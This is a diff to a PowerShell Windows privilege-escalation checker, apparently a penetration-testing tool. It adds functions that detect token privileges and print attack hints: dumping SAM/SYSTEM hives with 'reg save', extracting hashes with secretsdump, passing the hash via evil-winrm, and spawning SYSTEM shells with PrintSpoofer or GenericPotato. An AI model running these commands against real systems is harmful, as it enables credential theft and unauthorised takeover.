@@ -3,8 +3,8 @@
 # - [x] AlwaysInstallElevated
 # - [x] From local administrator to NT SYSTEM
 # - Impersonation Privileges
-#     - SeBackup (Read sensitive files: SAM/SYSTEM/MEMORY.DMP)
-#     - SeAssignPrimaryToken (Allows a user to impersonate tokens and privesc to NT SYSTEM using tools as potato.exe/rottenpotato.exe/juicyportato.exe)
+#     - [x] SeBackup (Read sensitive files: SAM/SYSTEM/MEMORY.DMP)
+#     - [x] SeAssignPrimaryToken (Allows a user to impersonate tokens and privesc to NT SYSTEM using tools as potato.exe/rottenpotato.exe/juicyportato.exe)
 #     - SeCreateToken (Create arbitrary token including local admin rights with "NtCreateToken")
 #     - SeDebug (Duplicate the "lsass.exe" token [https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1])
 #     - SeLoadDriver (Can be used to load buggy drivers as szkg64.sys [CVE-2018-15732])
@@ -12,7 +12,7 @@
 #     - SeTakeOwnership ('takeown.exe /f "%windir%\system32"' , 'icalcs.exe "%windir%\system32" /grant "%username%":F' , Rename cmd.exe to utilman.exe, lock and press Win+U )
 #     - SeTcb (Manipulate tokens to have local admin rights included. May require SeImpersonate to be verified.)
 #     - SeRelable (Allows you to own resources that have an integrity level even higher than your own [https://github.com/decoder-it/RelabelAbuse])
-#     - SeImpersonate (allows to impersonate any token, given that a handle to it can be obtained. Exploited with: juicy-potato/RogueWinRM/SweetPotato/PrintSpoofer)
+#     - [x] SeImpersonate (allows to impersonate any token, given that a handle to it can be obtained. Exploited with: juicy-potato/RogueWinRM/SweetPotato/PrintSpoofer)
 # - Privileged File Write (usable only before 1903)
 #     - WerTrigger (Exploit Privileged File Writes bugs with Windows Problem Reporting)
 #         - Clone https://github.com/sailay1996/WerTrigger
@@ -209,5 +209,77 @@ function Test-IsAdmin {
     } catch {
         Write-Error "Errors during the check: $_"
         return $false
+    }
+}
+
+function SeBackUpPrivilege {
+    <#
+    .DESCRIPTION
+        The SeBackupPrivilege is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects. 
+        This privilege can be used by certain backup programs or processes that require the capability to back up or copy files that would not normally be accessible to the user.
+    #>
+    
+    $userInformation = whoami /priv
+    if($userInformation -like "*SeBackUpPrivilege*") {
+        Write-Host -ForegroundColor Green "[YES]" -NoNewline
+        Write-Host " SeBackUpPrivilege for current account found. Check if enabled."
+        $userInformation -split "`n" | Where-Object {$_ -like "*SeBackUpPrivilege*"} | ForEach-Object {Write-Host $_}
+
+        Write-Host ""
+        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
+        Write-Host " Use: mkdir C:\temp ; reg save hklm\sam C:\temp\sam.hive ; reg save hklm\system C:\temp\system.hive"
+        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
+        Write-Host " Or Use: impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
+        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
+        Write-Host " Then: evil-winrm -i <ip> -u 'Administrator' -H '<hash>'"
+    } else {
+        Write-Host -ForegroundColor Red "[NO]" -NoNewline
+        Write-Host " No SeBackUpPrivilege for current account found."
+    }
+}
+
+function SeImpersonatePrivilege {
+    <#
+    .DESCRIPTION
+        The SeImpersonatePrivilege is a Windows privilege that grants a user or process the ability to impersonate the security context of another user or account. 
+        This privilege allows a process to assume the identity of a different user, enabling it to perform actions or access resources as if it were that user.
+    #>
+
+    $userInformation = whoami /priv
+    if($userInformation -like "*SeImpersonatePrivilege*") {
+        Write-Host -ForegroundColor Green "[YES]" -NoNewline
+        Write-Host " SeImpersonatePrivilege for current account found. Check if enabled."
+        $userInformation -split "`n" | Where-Object {$_ -like "*SeImpersonatePrivilege*"} | ForEach-Object {Write-Host $_}
+
+        Write-Host ""
+        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
+        Write-Host " Use: https://github.com/itm4n/PrintSpoofer => PrintSpoofer64.exe -i -c cmd"
+
+        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
+        Write-Host " OR Use: crackmapexec smb -u USERNAME -p PASSWORD -M impersonate"
+    } else {
+        Write-Host -ForegroundColor Red "[NO]" -NoNewline
+        Write-Host " No SeImpersonatePrivilege for current account found."
+    }
+}
+
+function SeAssignPrimaryToken {
+    <#
+    .DESCRIPTION
+        The SeAssignPrimaryToken allows a user to impersonate tokens and privesc to NT SYSTEM using tools like potato.exe/rottenpotato.exe/juicyportato.exe.
+    #>
+
+    $userInformation = whoami /priv
+    if($userInformation -like "*SeAssignPrimaryToken*") {
+        Write-Host -ForegroundColor Green "[YES]" -NoNewline
+        Write-Host " SeAssignPrimaryToken for current account found. Check if enabled."
+        $userInformation -split "`n" | Where-Object {$_ -like "*SeAssignPrimaryToken*"} | ForEach-Object {Write-Host $_}
+
+        Write-Host ""
+        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
+        Write-Host " Use: https://github.com/micahvandeusen/GenericPotato => \GenericPotato.exe -m=AUTO -p=cmd.exe"
+    } else {
+        Write-Host -ForegroundColor Red "[NO]" -NoNewline
+        Write-Host " No SeAssignPrimaryToken for current account found."
     }
 }
